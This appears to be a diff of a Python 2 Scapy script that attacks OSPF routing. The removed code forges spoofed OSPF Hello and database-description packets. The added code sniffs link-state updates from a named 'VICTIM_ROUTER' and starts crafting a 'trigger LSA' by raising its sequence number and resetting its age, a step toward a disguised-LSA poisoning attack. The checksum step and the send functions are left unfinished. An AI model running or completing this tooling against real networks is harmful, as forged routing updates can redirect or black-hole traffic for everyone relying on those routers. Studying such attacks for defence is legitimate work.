@@ -15,105 +15,54 @@ from time import sleep
 load_contrib("ospf")
 
 
-SOURCE_ADDRESS = '10.0.1.3'
-DESTINATION_ADDRESS = '10.0.1.2'
-HELLO_DESTINATION_ADDRESS = '224.0.0.5'
-HELLO_INTERVAL = 10
-DEAD_INTERVAL = 40
-TTL = 64
+VICTIM_ROUTER = '4.4.4.4'
+
 
 eight_bit_space = [1L, 2L, 4L, 8L, 16L, 32L, 64L, 128L]
 
-def print_long_line():
-	print '#################################################################################'
+
+def pt():
+	# print time
+	print datetime.datetime.now().strftime("%H:%M:%S")
 
 
 def log(s, col="green"):
 	print T.colored(s, col)
 
 
-def send_hello_packet(srcIP, dstIP):
-	ip_packet = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)
+def frame_callback(frame):
 
-	ospf_header = OSPF_Hdr(\
-		src='2.2.2.3')
+	if frame.getlayer(IP) and frame.getlayer(IP).proto == 89: # OSPF
 
-	ospf_payload = OSPF_Hello(\
-		hellointerval=HELLO_INTERVAL, \
-		deadinterval=DEAD_INTERVAL,\
-		mask='0.0.0.0',\
-		neighbors=['2.2.2.2', '1.1.1.1'],\
-		#router='10.0.1.3',\
-		#backup='10.0.1.2',\
-		options=2L)
+		ospf_packet = frame.getlayer(IP).payload
 
-	ospf_hello_packet = ip_packet/ospf_header/ospf_payload
+		if ospf_packet.type == 4: # LS Update
+			for lsa in ospf_packet[OSPF_Hdr].lsalist:
+				if lsa.adrouter == VICTIM_ROUTER:
+					print '############################################################ before'
+					lsa.show()
 
-	ospf_hello_packet.show()
-	print_long_line()
+					# crafting trigger lsa
 
-	print 'sending hello message at %s' % (datetime.datetime.now().strftime("%H:%M:%S"))
+					# sequence number
+					triggerLSAseqNum = lsa.seq + 1
+					lsa.seq = triggerLSAseqNum
 
-	send(ospf_hello_packet)
+					# age
+					lsa.age = 0
 
+					# checksum
+					# TODO continue
 
-def send_empty_dbd_messages(srcIP, dstIP, n, interval):
-	ip_packet = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)
+					print '############################################################ after'
+					lsa.show()
 
-	seqNum = randint(0, 2147483648)
-
-	ospf_header = OSPF_Hdr(\
-		src='2.2.2.3',\
-		type=2)
-
-	ospf_payload = OSPF_DBDesc(\
-		dbdescr=7L,\
-		options=2L)
-
-	ospf_dbd_message_packet = ip_packet/ospf_header/ospf_payload
-
-	ospf_dbd_message_packet.show()
-	print_long_line()
-
-	for i in xrange(0, n):
-		print 'sending %d-th dbd message with seqNum %d at %s' % (i+1, seqNum + i, datetime.datetime.now().strftime("%H:%M:%S"))
-
-		sleep(interval)
-
-		ospf_dbd_message_packet.payload.payload.ddseq = seqNum + i
-
-		send(ospf_dbd_message_packet)
+					sys.stdout.flush()
 
 
-def send_hello_messages(srcIP, dstIP, interval):
-	ip_packet = IP(src=srcIP, dst=dstIP, ttl=TTL, proto=89)
-
-	ospf_header = OSPF_Hdr(\
-		src='2.2.2.3')
-
-	ospf_payload = OSPF_Hello(\
-		hellointerval=HELLO_INTERVAL, \
-		deadinterval=DEAD_INTERVAL,\
-		mask='0.0.0.0',\
-		neighbors=['2.2.2.2', '1.1.1.1'],\
-		#router='10.0.1.3',\
-		#backup='10.0.1.2',\
-		options=2L)
-
-	dbd_message_packet = ip_packet/ospf_header/ospf_payload
-
-	dbd_message_packet.show()
-	print_long_line()
-
-	i = 0
-
-	while True:
-		print 'sending %d-th hello message at %s' % (i+1, datetime.datetime.now().strftime("%H:%M:%S"))
-
-		sleep(interval)
-
-		send(dbd_message_packet)
-
+def capture_ospf_messages():
+	sniff(prn=frame_callback, filter='ip', store=0)
+	
 
 def send_trigger_lsa():
 	pass
@@ -124,6 +73,8 @@ def send_disguised_lsa():
 
 
 def main():
+	capture_ospf_messages()
+
 	send_trigger_lsa()
 
 	send_disguised_lsa()
@@ -131,3 +82,4 @@ def main():
 
 if __name__ == "__main__":
 	main()
+
